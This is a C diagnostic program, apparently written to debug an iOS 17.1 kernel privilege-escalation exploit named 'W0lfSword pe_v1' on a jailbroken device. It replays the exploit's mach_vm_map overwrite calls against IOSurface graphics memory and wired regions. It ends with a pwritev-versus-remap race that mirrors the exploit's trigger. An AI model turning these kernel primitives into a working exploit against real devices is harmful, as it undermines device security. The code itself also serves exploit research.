// primtest — replicate W0lfSword pe_v1's critical mach_vm_map calls on-device
// as root (jailbroken), isolating which parameter/flags get kr=4 on iOS 17.1.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include <errno.h>
#include <pthread.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <unistd.h>
#include <IOSurface/IOSurfaceRef.h>
#include <CoreFoundation/CoreFoundation.h>

kern_return_t mach_vm_map(vm_map_t task, mach_vm_address_t *address,
    mach_vm_size_t size, mach_vm_offset_t mask, int flags,
    mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy,
    vm_prot_t cur, vm_prot_t max, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t task, mach_vm_address_t *address,
    mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t task, mach_vm_address_t address,
    mach_vm_size_t size);
kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
    mach_vm_size_t *size, mach_vm_address_t offset, vm_prot_t permission,
    mach_port_t *object_handle, mem_entry_name_port_t parent_entry);

static const mach_vm_size_t PAGE = 0x4000;

static volatile int t4stop = 0;
static mach_port_t t4obj;
static mach_vm_address_t t4addr;
static mach_vm_size_t t4sz;
static void *racer(void *arg) {
    int ok = 0, kr4 = 0, other = 0;
    while (!t4stop) {
        mach_vm_address_t a = t4addr;
        kern_return_t kr = mach_vm_map(mach_task_self(), &a, t4sz, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, t4obj, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr == 0) ok++;
        else if (kr == 4) kr4++;
        else other++;
    }
    printf("  racer thread: kr0=%d kr4=%d other=%d\n", ok, kr4, other);
    return NULL;
}

static void test(char *name, mach_port_t obj, mach_vm_address_t addr,
                 mach_vm_size_t size, int flags, mach_vm_offset_t off,
                 int copy) {
    mach_vm_address_t a = addr;
    kern_return_t kr = mach_vm_map(mach_task_self(), &a, size, 0, flags, obj,
                                   off, copy, VM_PROT_DEFAULT, VM_PROT_DEFAULT,
                                   VM_INHERIT_NONE);
    printf("%-52s kr=%d (0x%x) addr=%#llx\n", name, kr, kr, a);
}

int main(void) {
    printf("primtest: iOS %s\n", "17.1 jailbroken root");
    printf("PAGE=0x%llx\n", PAGE);

    // --- A: plain allocation + memory entry (sanity) ---
    mach_vm_address_t plain = 0;
    mach_vm_size_t plainSize = 0x1000 * PAGE; // 64MB search mapping
    kern_return_t kr = mach_vm_allocate(mach_task_self(), &plain, plainSize,
                                        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    printf("plain alloc: kr=%d addr=%#llx\n", kr, plain);
    if (kr != 0) return 1;
    for (mach_vm_size_t k = 0; k < plainSize; k += PAGE)
        *(volatile uint64_t *)(plain + k) = 0xdeadbeef;

    mach_port_t objA = 0;
    mach_vm_size_t szA = plainSize;
    kr = mach_make_memory_entry_64(mach_task_self(), &szA, plain,
                                   VM_PROT_DEFAULT, &objA, 0);
    printf("memory entry A: kr=%d port=%#x size=%#llx\n", kr, objA, szA);

    // --- B: gfx mapping (PurpleGfxMem) like create_physically_contiguous_mapping ---
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    uint64_t pcSize = 2 * PAGE; // OOB_PAGES_NUM * PAGE
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &pcSize);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), n);
    CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
    IOSurfaceRef surface = IOSurfaceCreate(props);
    printf("PurpleGfxMem IOSurfaceCreate: %s\n", surface ? "OK" : "FAILED");
    mach_vm_address_t gfxAddr = 0;
    if (surface) {
        gfxAddr = (mach_vm_address_t)IOSurfaceGetBaseAddress(surface);
        printf("gfx base address: %#llx\n", gfxAddr);
    }
    mach_port_t objB = 0;
    mach_vm_size_t szB = pcSize;
    if (surface && gfxAddr) {
        kr = mach_make_memory_entry_64(mach_task_self(), &szB, gfxAddr,
                                       VM_PROT_DEFAULT, &objB, 0);
        printf("gfx memory entry: kr=%d port=%#x size=%#llx\n", kr, objB, szB);
    }

    // map the gfx entry ANYWHERE -> pcAddress
    mach_vm_address_t pcAddress = 0;
    if (objB) {
        kr = mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
                         VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, objB, 0, 0,
                         VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        printf("gfx map ANYWHERE: kr=%d pcAddress=%#llx\n", kr, pcAddress);
    }

    printf("----------------------------------------\n");
    printf("replicating free_thread's mach_vm_map shapes:\n");

    // T1: the EXACT failing call — search-mapping object FIXED|OVERWRITE at gfx addr, offset 0
    if (objB && pcAddress)
        test("T1 gfx@pc FIXED|OVERWRITE objA off=0", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
    // T2: offset 0x1000
    if (objB && pcAddress)
        test("T2 gfx@pc FIXED|OVERWRITE objA off=0x1000", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0x1000, 0);
    // T3: without OVERWRITE
    if (objB && pcAddress)
        test("T3 gfx@pc FIXED (no OVW) objA off=0", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED, 0, 0);
    // T4: over the PLAIN mapping instead of gfx
    test("T4 plain FIXED|OVERWRITE objA off=0", objA, plain, pcSize,
         VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
    // T5: FIXED over plain, no OVW
    test("T5 plain FIXED (no OVW) objA off=0", objA, plain, pcSize,
         VM_FLAGS_FIXED, 0, 0);
    // T6: gfx object re-mapped over gfx address (self)
    if (objB && pcAddress)
        test("T6 gfx FIXED|OVERWRITE objB(gfx) off=0", objB, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
    // T7: gfx object over plain
    if (objB)
        test("T7 plain FIXED|OVERWRITE objB(gfx) off=0", objB, plain, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
    // T8: objA ANYWHERE (sanity, should work)
    test("T8 objA ANYWHERE", objA, 0, pcSize,
         VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, 0, 0);
    // T9: copy=1 variant of T1
    if (objB && pcAddress)
        test("T9 gfx@pc FIXED|OVW objA off=0 copy=1", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 1);
    // T10: larger offset (0x40000) — beyond nothing, still inside 64MB object
    if (objB && pcAddress)
        test("T10 gfx@pc FIXED|OVW objA off=0x40000", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0x40000, 0);
    // T11: offset near object end
    if (objB && pcAddress)
        test("T11 gfx@pc FIXED|OVW objA off=size-0x8000", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, plainSize - 0x8000, 0);
    // T12: offset EXACTLY object size (should fail - beyond end)
    if (objB && pcAddress)
        test("T12 gfx@pc FIXED|OVW objA off=size (EOF)", objA, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, plainSize, 0);
    // T13: size larger than object remainder
    if (objB && pcAddress)
        test("T13 gfx@pc FIXED|OVW objA off=size-0x4000 size=0x8000",
             objA, pcAddress, 0x8000, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             plainSize - 0x4000, 0);
    // T14: null object
    if (pcAddress)
        test("T14 gfx@pc FIXED|OVW object=0 off=0", 0, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
    // T15: dead port object
    mach_port_t dead = 0x1234;
    if (pcAddress)
        test("T15 gfx@pc FIXED|OVW object=deadport", dead, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);

    printf("----------------------------------------\n");
    printf("wired-target experiments:\n");
    mach_vm_address_t W = 0;
    kr = mach_vm_allocate(mach_task_self(), &W, 0x8000,
                          VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    printf("wired region alloc: kr=%d W=%#llx\n", kr, W);
    *(volatile uint64_t *)W = 1;
    int ml = mlock((void *)W, 0x8000);
    printf("mlock: %d (errno=%d)\n", ml, errno);
    if (W) {
        test("TW1 entryA FIXED|OVW over mlock'd region", objA, W, 0x8000,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
        munlock((void *)W, 0x8000);
        kr = mach_vm_deallocate(mach_task_self(), W, 0x8000);
        printf("dealloc wired region: kr=%d\n", kr);
        test("TW2 entryA FIXED after dealloc", objA, W, 0x8000, VM_FLAGS_FIXED, 0, 0);
        // restore for TW3
        mach_vm_deallocate(mach_task_self(), W, 0x8000);
        mach_vm_allocate(mach_task_self(), &W, 0x8000,
                         VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        *(volatile uint64_t *)W = 1;
        mlock((void *)W, 0x8000);
        // overwrite the wired region with the SAME object that's mapped there? no — objA again but via dealloc inside the same flow:
        test("TW3 entryA FIXED|OVW over mlock'd region (retry)", objA, W, 0x8000,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);
    }

    printf("----------------------------------------\n");
    printf("restore pcAddress mapping (gfx obj back):\n");
    if (objB && pcAddress)
        test("R1 gfx@pc FIXED|OVW objB off=0 (restore)", objB, pcAddress, pcSize,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0);

    printf("----------------------------------------\n");
    printf("TW4: concurrent pwritev + FIXED|OVW map race:\n");
    {
        t4stop = 0;
        // target region
        mach_vm_address_t R = 0;
        mach_vm_allocate(mach_task_self(), &R, 0x8000, VM_FLAGS_ANYWHERE);
        for (int k = 0; k < 0x8000; k += 0x4000) *(volatile uint64_t *)(R + k) = 0xabc;
        t4addr = R; t4sz = 0x8000; t4obj = objA;
        // the 2-page target file
        int tfd = open("/tmp/primtest_racefile", O_RDWR | O_CREAT | O_TRUNC, 0600);
        ftruncate(tfd, 0x2000);
        pthread_t th;
        pthread_create(&th, NULL, racer, NULL);
        struct iovec riov;
        riov.iov_base = (void *)(R + 0x3f00);
        riov.iov_len = 0x1000;
        for (int i = 0; i < 2000; i++) {
            pwritev(tfd, &riov, 1, 0x3f00);
        }
        t4stop = 1;
        pthread_join(th, NULL);
        close(tfd);
        printf("  (pwritev loop done)\n");
    }

    printf("primtest done\n");
    return 0;
}
